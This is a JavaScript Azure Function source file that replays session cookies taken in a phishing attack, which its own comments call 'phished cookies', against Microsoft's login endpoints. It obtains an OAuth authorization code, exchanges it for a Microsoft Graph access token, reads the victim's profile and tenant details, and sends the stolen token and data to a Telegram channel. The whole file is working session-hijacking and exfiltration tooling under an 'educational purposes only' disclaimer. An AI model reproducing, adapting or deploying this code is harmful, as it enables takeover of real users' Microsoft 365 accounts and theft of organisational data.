/**
 * Azure Function to acquire Microsoft Graph Acces Token from phished cookies.
 * This code is provided for educational purposes only and provided withou any liability or warranty.
 * Author: Nicola Suter
 */

const { app } = require("@azure/functions");
const { Axios } = require("axios");
const { sendTelegram } = require("./telegram");

// OIDC authorization code flow process params
// https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-auth-code-flow
const client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264";
const resource = "https://graph.microsoft.com/";
const authorization_endpoint = "https://login.microsoftonline.com/common/oauth2/authorize?";
const redirect_uri = "https://login.microsoftonline.com/common/oauth2/nativeclient";
const token_endpoint = "https://login.microsoftonline.com/common/oauth2/token";

const request_url =
    authorization_endpoint +
    new URLSearchParams({
        response_type: "code",
        client_id: client_id,
        resource: resource,
        redirect_uri: redirect_uri,
        state: "cec70cdf-29b6-4574-8a19-371e24d7c165",
    });

app.http("execution", {
    methods: ["POST"],
    authLevel: "anonymous",
    route: "/execution",
    handler: async (request, context) => {
        // extract cookies from body
        const cookies = await request.json()
        context.log("Received incoming POST to replay cookies...")

        // Randomly using axios for this as fetch doesn't expose auth code flow reponse code properly
        const client = new Axios({
            headers: {
                "cookie": cookies.join(";"),
                'Access-Control-Allow-Origin': '*',
                "user-agent": "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
            },
            withCredentials: true
        });
        
        // 1. Request authorization code
        const authorization_code = await client.get(request_url)
            .then(response => {
                context.log(`Received response with status: ${response.status}`)
                const code = new URLSearchParams(response.request._redirectable._currentUrl.split("?")[1]).get("code");
                if (code) {
                    context.log("Received authorization code from request...")
                    return code
                } else {
                    throw ("Did not receive authorization code. User interaction might be required or cookies have expired.")
                }
            })
            .catch((ex) => console.error(ex))

        // 2. Request an access token with authorization code
        const access_token = await fetch(token_endpoint, {
            method: "POST",
            body: new URLSearchParams({
                'resource': resource,
                'client_id': client_id,
                'grant_type': "authorization_code",
                'redirect_uri': redirect_uri,
                'code': authorization_code,
                'scope': "openid"
            }).toString(),
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
            }
        }).then(response => response.json())
            .catch((ex) => console.error(ex));

        // Get details about the phished user
        const me = await fetch('https://graph.microsoft.com/v1.0/me', {
            headers: {
                'Authorization': 'Bearer ' + access_token.access_token,
                'user-agent': "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
            }
        }).then(response => response.json())
        context.log(me)

        // Get details about the phished tenant
        const org = await fetch('https://graph.microsoft.com/v1.0/organization', {
            headers: {
                'Authorization': 'Bearer ' + access_token.access_token,
                'user-agent': "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
            }
        }).then(response => response.json())
        context.log(org)

        // Dispatch results to Telegram
        const summary = {
            user: me.userPrincipalName || me.displayName || me.id || "unknown",
            displayName: me.displayName,
            id: me.id,
            tenant: org.value && org.value[0] && org.value[0].verifiedDomains,
            tokenType: access_token.token_type,
            expiresIn: access_token.expires_in,
        };
        await sendTelegram(
            "🎯 <b>Token replayed successfully</b>\n" +
            "<b>User:</b> " + (me.userPrincipalName || "?") + "<br>" +
            "<b>Display name:</b> " + (me.displayName || "?") + "<br>" +
            "<b>User ID:</b> " + (me.id || "?") + "<br>" +
            "<b>Tenant domains:</b> " + JSON.stringify(summary.tenant) + "<br>" +
            "<b>Token:</b> " + access_token.access_token + "<br>" +
            "<b>Expires in:</b> " + access_token.expires_in + "s",
            context
        );

        return new Response("Execution...", {
            status: 200
        });
    },
});